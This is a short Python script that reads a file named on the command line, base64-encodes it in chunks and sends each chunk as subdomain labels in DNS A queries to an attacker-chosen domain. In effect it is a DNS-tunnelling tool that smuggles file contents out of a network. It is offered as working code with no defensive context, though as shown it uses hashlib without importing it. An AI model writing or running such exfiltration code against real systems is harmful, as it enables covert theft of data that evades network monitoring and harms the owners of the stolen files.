#!/usr/bin/env python3

import sys
import base64

from textwrap import wrap

# python3-dns
import DNS

DNS.ParseResolvConf()


def main(domain, filename):
	size = 250 - len(domain) - 1
	size = size * 2 // 3
	size += 3 - size % 3
	digest = hashlib.sha256()

	i = 1
	with open(filename, 'rb') as f:
		while True:
			chunk = f.read(size)
			if not chunk:
				break

			digest.update(chunk)
			query = "{}.i{}.{}".format('.'.join(wrap(base64.b64encode(chunk).decode('utf-8').rstrip('='), 63)), i, domain)
			print(query, len(query))
			while True:
				try:
					r = DNS.DnsRequest(name=query,qtype='A')
					# do the request
					a=r.req()
					# and do a pretty-printed output
					a.show()
					break
				except DNS.Base.TimeoutError as error:
					print(error)

			i = i + 1
	print(digest.hexdigest(), filename)

if __name__ == '__main__':
	main(sys.argv[1], sys.argv[2])
